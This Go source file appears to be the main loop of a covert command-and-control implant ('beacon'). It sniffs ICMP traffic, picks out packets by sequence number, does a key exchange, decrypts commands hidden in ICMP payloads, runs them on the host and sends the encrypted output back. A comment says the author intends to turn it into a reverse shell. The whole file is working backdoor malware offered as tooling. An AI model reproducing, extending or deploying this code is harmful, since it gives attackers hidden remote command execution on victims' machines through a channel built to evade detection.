package main

import (
	c "beacon/crypto"
	e "beacon/exec"
	h "beacon/helper"
	"log"

	"github.com/google/gopacket"
	"github.com/google/gopacket/layers"
	"github.com/google/gopacket/pcap"
)

// gotta rewrite to make it a reverse shell

func main() {
	//Gen ID
	h.BeaconID = h.RandStringBytes(16)

	// Open network interface
	handle, err := pcap.OpenLive("en0", 65536, true, pcap.BlockForever)
	if err != nil {
		log.Fatal(err)
	}
	defer handle.Close()

	// Set a filter to capture only ICMP packets
	err = handle.SetBPFFilter("icmp")
	if err != nil {
		log.Fatal(err)
	}

	// Start capturing packets
	packetSource := gopacket.NewPacketSource(handle, handle.LinkType())

	cryptSource := make(chan *layers.ICMPv4)
	cmdSource := make(chan *layers.ICMPv4)
	handShakeSeqNum, commandSeqNum := h.GenSeqNum()
	go func() {
		for packet := range packetSource.Packets() {
			if icmpLayer := packet.Layer(layers.LayerTypeICMPv4); icmpLayer != nil {
				icmpPacket, _ := icmpLayer.(*layers.ICMPv4)
				if icmpPacket.Seq == uint16(handShakeSeqNum) {
					cryptSource <- icmpPacket
				}
				if icmpPacket.Seq == uint16(commandSeqNum) {
					cmdSource <- icmpPacket
				}

			}

		}
	}()
	// BLOCKS HERE V
	//start handshake
	key, err := c.KeyExhcange(c.WeakKey, h.BeaconID) //ON THE SERVE SIDE REMBER TO ADD TIME FOR THE SEQ NUMBER TO BE USED

	if err != nil {
		log.Fatal(err.Error())
	}

	for {
		select {
		case cryptpacket := <-cryptSource:
			bytesIcmpPacket, err := h.EncodeGob(cryptpacket.Payload) //get icmp payload
			if err != nil {
				log.Fatal(err.Error())
				continue
			}
			h.Crypt <- bytesIcmpPacket.Bytes() //send payload to crypto
			continue

		case cmdPacket := <-cmdSource:
			cmd, err := c.DecBlob(key, cmdPacket.Payload)

			if err != nil {
				log.Fatal(err.Error())
			}

			//log.Println("[+] got command: ", string(cmd))

			out, err := e.RunCMD(string(cmd))

			if err != nil {
				log.Fatal(err.Error())
			}

			//log.Println(string(out))

			err = c.Send(out, key)
			if err != nil {
				log.Fatal(err.Error())
			}

		}
	}

}
